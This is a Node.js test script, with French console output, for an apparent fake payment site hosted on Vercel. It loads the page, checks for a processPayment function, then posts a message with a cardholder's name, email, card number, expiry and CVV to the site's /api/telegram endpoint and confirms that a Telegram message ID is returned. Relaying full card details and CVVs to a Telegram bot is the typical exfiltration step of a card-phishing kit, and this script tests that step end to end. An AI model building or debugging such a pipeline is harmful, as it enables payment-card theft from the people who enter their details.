const fetch = require('node-fetch');

console.log('🚨 TEST URGENT DU SITE DE PAIEMENT');
console.log('==================================');

const CONFIG = {
    SITE_URL: 'https://test-alpha-lac-68.vercel.app',
    API_URL: 'https://test-alpha-lac-68.vercel.app/api/telegram'
};

async function testSiteLoad() {
    try {
        console.log('🔍 Test de chargement du site...');
        const response = await fetch(CONFIG.SITE_URL);
        const html = await response.text();
        
        if (html.includes('processPayment')) {
            console.log('✅ Site se charge - fonction processPayment trouvée');
            return true;
        } else {
            console.log('❌ Site se charge mais processPayment manquante');
            return false;
        }
    } catch (error) {
        console.log('❌ Erreur chargement site:', error.message);
        return false;
    }
}

async function testAPI() {
    try {
        console.log('🔧 Test de l\'API...');
        const response = await fetch(CONFIG.API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                message: '🧪 TEST URGENT API - ' + new Date().toLocaleTimeString(),
                type: 'test'
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            console.log('✅ API fonctionne - Message ID:', result.telegramResponse?.result?.message_id);
            return true;
        } else {
            console.log('❌ API erreur:', result.error);
            return false;
        }
    } catch (error) {
        console.log('❌ Erreur API:', error.message);
        return false;
    }
}

async function testPayment() {
    try {
        console.log('💳 Test de paiement complet...');
        
        const paymentMessage = `💰 NOUVEAU PAIEMENT REÇU !
👤 Nom: Test Urgent
📧 Email: urgent@test.com
💳 Carte: 1234 **** **** 5678
📅 Expiration: 12/25
🔐 CVV: 123
💶 Montant: 99.99€
🔒 Vérifiez immédiatement !`;

        const response = await fetch(CONFIG.API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                message: paymentMessage,
                type: 'payment'
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            console.log('✅ Paiement testé avec succès !');
            console.log('📱 Message ID:', result.telegramResponse?.result?.message_id);
            console.log('📄 Contenu envoyé:');
            console.log(paymentMessage);
            return true;
        } else {
            console.log('❌ Erreur paiement:', result.error);
            return false;
        }
    } catch (error) {
        console.log('❌ Erreur paiement:', error.message);
        return false;
    }
}

async function runTests() {
    console.log('🚀 Démarrage des tests...\n');
    
    const siteOK = await testSiteLoad();
    console.log('');
    
    const apiOK = await testAPI();
    console.log('');
    
    const paymentOK = await testPayment();
    console.log('');
    
    console.log('📊 RÉSULTATS:');
    console.log('=============');
    console.log(`Site: ${siteOK ? '✅ OK' : '❌ ERREUR'}`);
    console.log(`API: ${apiOK ? '✅ OK' : '❌ ERREUR'}`);
    console.log(`Paiement: ${paymentOK ? '✅ OK' : '❌ ERREUR'}`);
    
    if (siteOK && apiOK && paymentOK) {
        console.log('\n🎉 TOUT FONCTIONNE ! Le problème doit être dans le navigateur.');
        console.log('💡 Essayez de vider le cache du navigateur (Ctrl+Shift+R)');
    } else {
        console.log('\n❌ Il y a un problème technique à résoudre.');
    }
}

runTests().catch(console.error);
